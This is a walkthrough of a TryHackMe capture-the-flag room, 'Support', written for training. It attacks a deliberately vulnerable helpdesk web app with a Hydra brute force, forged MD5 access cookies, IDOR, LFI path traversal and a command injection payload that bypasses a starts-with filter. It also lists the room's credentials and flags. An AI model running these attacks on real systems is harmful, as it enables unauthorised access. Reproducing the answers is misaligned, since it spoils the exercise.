# TryHackMe: Support — Walkthrough

**Room type:** CTF  
**Category:** Web / LFI / Broken Access Control / IDOR / Command Injection  
**Flags:** 2

| Flag | Value |
|------|-------|
| Admin login | `THM{I_AM_ADMIN999}` |
| /home/ubuntu/user.txt | `THM{GOT_THE_FLAG001}` |

---

## Overview

Support is a web application CTF built around a fictional internal helpdesk platform. The room description hints at "system-level operations" and "weak trust boundaries" — both deliberate signals that RCE is the endgame and that client-side trust is exploitable. The attack chain runs through five distinct vulnerability classes: credential brute force, broken access control via cookie manipulation, IDOR via an unauthenticated API, LFI via a skin parameter, and finally command injection through an admin-only diagnostic feature.

---

## Reconnaissance

Starting with a port scan:

```bash
nmap -sV -sC --open -p- --min-rate 5000 $IP
```

Two ports open: **22 (SSH)** and **80 (HTTP)**. The SSH service required public key authentication, so the web application on port 80 was the only surface. Nmap also flagged that the `PHPSESSID` cookie lacked the `HttpOnly` flag — a small but telling sign of the development culture here.

The login page itself leaked a username: the placeholder text in the email field read `help@support.thm`, and a footer note confirmed it: "Problems signing in? Contact IT Operations @ help@support.thm."

Directory enumeration turned up several useful targets:

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,json -t 40
```

```
api.php          (302 → index.php)
config.php       (200, 0 bytes)
dashboard.php    (302 → index.php)
footer.php       (200)
includes/        (301, directory listing)
info.php         (200, phpinfo())
skins/           (301, directory listing)
```

`info.php` was a full `phpinfo()` dump — useful for understanding the environment. Notably, `disable_functions` was empty, meaning `system()`, `shell_exec()`, and friends were all available if we ever reached code execution. `config.php` returned 200 with zero bytes, confirming it was PHP executing without echo output.

---

## Flag 1 — Admin Login

### Step 1: Brute Force `help@support.thm`

The login form used `email` and `password` fields with a POST to `index.php`. With a known username from the page placeholder, the next step was password brute force:

```bash
hydra -l "help@support.thm" -P /usr/share/wordlists/rockyou.txt \
  -s 80 $IP http-post-form \
  "/:email=^USER^&password=^PASS^:Invalid credentials" \
  -t 20 -f -I
```

Hydra returned a hit quickly: **`help@support.thm:snoopy`**.

Logging in placed us on a basic helpdesk dashboard with a ticket management card and a theme selector in the footer. Nothing sensitive at first glance — but the cookie jar was worth inspecting.

### Step 2: Broken Access Control via Cookie Manipulation

Opening browser DevTools → Storage → Cookies revealed an `isITUser` cookie set to:

```
68934a3e9455fa72420237eb05902327
```

That's `md5('false')`. The application was using a client-side MD5 hash to track whether the logged-in user was an IT admin. Since nothing stops a client from changing their own cookies, we replaced it with `md5('true')`:

```
b326b5062b2f0e69046810717534cb09
```

After refreshing the page, an **IT Admin Panel** card appeared with a **View API** button. The trust boundary was entirely client-side — a textbook broken access control finding.

### Step 3: IDOR via the Internal User API

The API page showed our own user profile at `/user/3`:

```json
{
    "email": "help@support.thm",
    "2FA": false,
    "admin": false
}
```

The endpoint accepted a user ID in the URL path. Changing it to `/user/1`:

```json
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}
```

We now had the administrator's email address. The password field was stripped server-side before output — but the email was enough to pivot.

### Step 4: LFI via the Skin Parameter

Reading the footer source revealed a theme selector: `?skin=default`, `?skin=red`, etc. The include chain resolved to `skins/$skin.php`. Path traversal on the skin parameter allowed us to read PHP files within the webroot:

```bash
curl -s "http://$IP/dashboard.php?skin=../config" \
  -b "PHPSESSID=$SESSID"
```

The raw PHP source of `config.php` was returned inline:

```php
$MASTER_PASSWORD = 'support@110';
$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```

The `MASTER_PASSWORD` value looked immediately useful. We tried logging in as `specialadmin@support.thm` with `support@110` — it failed. This sent us down a lengthy dead end.

We read more source files via the same LFI to understand the login logic:

```bash
curl -s "http://$IP/dashboard.php?skin=../index" \
  -b "PHPSESSID=$SESSID"
```

The login code confirmed plaintext password comparison against a `$users` array loaded from `/var/www/db.php` — outside the webroot and unreachable via LFI. `MASTER_PASSWORD` was not referenced anywhere in the login flow. It was a red herring.

We also read `api.php` and `dashboard.php` via LFI, which revealed:
- The admin flag lived at `/var/www/web.txt`, displayed when `$_SESSION['admin'] === true`
- The `api.php` access check used `md5('true')` — which we had already bypassed via cookie
- The LFI itself was restricted to `/var/www/html/` via `realpath()` checks, blocking access to `db.php`

### Step 5: Finding the Admin Password

After exhausting the LFI surface, the correct path was manual variation on the `MASTER_PASSWORD` value. The `@` in `support@110` was the misdirect. Removing it gave `support110`, which worked:

```
specialadmin@support.thm : support110
```

This is confirmed by multiple external walkthroughs, all of which hit the same wall:

> *"After trying a few variations, the solution turned out to be removing the `@` symbol."*
> — [root0x09, Medium](https://root0x09.medium.com/support-tryhackme-walkthrough-20f207aa287e)

The `MASTER_PASSWORD = 'support@110'` in `config.php` appears to serve no functional purpose in the application's login logic. It is never checked against any credential in code we could read. Whether it's an intentional misdirect or a development artefact is unclear, but every solver hits it and every solver has to work past it.

### Flag 1

Logging in as `specialadmin@support.thm:support110` loaded the admin dashboard, which displayed:

**`THM{I_AM_ADMIN999}`**

---

## Flag 2 — Remote Code Execution

### Step 6: Command Injection via the `sys` Parameter

The admin dashboard included a **Date** dropdown in the footer — not visible to helpdesk users. Reading the dashboard and footer source via LFI had already shown us the relevant PHP:

```php
$isAdmin = $_SESSION['admin'];

if ($isAdmin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys'])) {
    $sys = $_POST['sys'];
    if (strpos($sys, 'date') === 0) {
        $output = shell_exec($sys);
    } else {
        $error = 'Only date command is allowed.';
    }
}
```

The filter checked that the `sys` value **starts with** `date` using `strpos($sys, 'date') === 0`. This is trivially bypassed by prepending `date` to any command using a shell separator.

We submitted via POST:

```bash
curl -s "http://$IP/dashboard.php" \
  -b "PHPSESSID=$ADMINSESSID" \
  -X POST \
  -d "sys=date;cat+/home/ubuntu/user.txt"
```

The output rendered in the footer's `container mt-3` div:

```
Sat Oct  3 14:17:21 UTC 2026
THM{GOT_THE_FLAG001}
```

**Flag 2: `THM{GOT_THE_FLAG001}`**

The separator `|` also works (`date|cat /home/ubuntu/user.txt`), as confirmed by external walkthroughs. Both `|` and `;` bypass the starts-with filter since the filter only checks the beginning of the string.

---

## Full Attack Chain

```
Unauthenticated
    ↓
Brute force (Hydra + rockyou.txt)
    → help@support.thm:snoopy
    ↓
Broken Access Control
    → isITUser cookie: md5('false') → md5('true')
    → IT Admin Panel unlocked
    ↓
IDOR (/user/1)
    → specialadmin@support.thm (admin: true)
    ↓
LFI (?skin=../config)
    → MASTER_PASSWORD = 'support@110' (red herring)
LFI (?skin=../index, ../api, ../dashboard, ../footer)
    → Login logic, API bypass, admin flag path, sys filter
    ↓
Manual variation on MASTER_PASSWORD
    → support@110 → support110
    ↓
Admin login (specialadmin@support.thm:support110)
    → THM{I_AM_ADMIN999}
    ↓
Command injection (sys=date;cat /home/ubuntu/user.txt)
    → THM{GOT_THE_FLAG001}
```

---

## Key Takeaways

**Client-side trust is not trust.** The `isITUser` cookie was the most direct vulnerability in the room — a boolean access check implemented entirely in the browser. Replacing `md5('false')` with `md5('true')` took ten seconds and unlocked an entire access tier. Any authorization decision that can be changed by the user without server validation is not an authorization decision.

**IDOR via sequential IDs is a fast enumeration path.** The API exposed user objects at predictable integer paths. Changing `/user/3` to `/user/1` was all it took to enumerate the administrator's identity. The password was stripped from the response, but the email was enough to move forward.

**LFI source review beats blind exploitation.** Rather than guessing at endpoints and payloads, the LFI let us read the application's own PHP before attacking it. We knew exactly what the login logic compared, where the flags were stored, how the command filter worked, and what the bypass was — all from source, not from trial and error.

**`starts-with` filters on shell commands are not filters.** The `strpos($sys, 'date') === 0` check was designed to restrict the `sys` parameter to the `date` command. It does not. Any input beginning with `date` passes the check, regardless of what follows. Shell separators like `;` and `|` allow arbitrary additional commands to execute.

**Not everything in a config file is a credential.** `MASTER_PASSWORD = 'support@110'` looked like a login password and cost significant time. It wasn't. The actual admin password lived in `db.php` outside the webroot — never directly readable — and was a variation of the config value with the `@` removed. The lesson: config values that look like passwords should be tested, but also varied, and never assumed to be exactly as found.

---

## External References

- [sornphut — Support | TryHackMe | Walkthrough](https://medium.com/@sornphut/support-tryhackme-walkthrough-08645b57c392) — Confirms `specialadmin@support.thm:support110`
- [root0x09 — Support | THM — Walkthrough](https://root0x09.medium.com/support-tryhackme-walkthrough-20f207aa287e) — Documents the `support@110` red herring and `@` removal variation
- [gowrishankar — Support TryHackMe Room Walkthrough](https://medium.com/@gowrishankar.a391/support-tryhackme-room-walkthrough-333977ef248b) — Notes finding the master password via LFI as a stepping stone
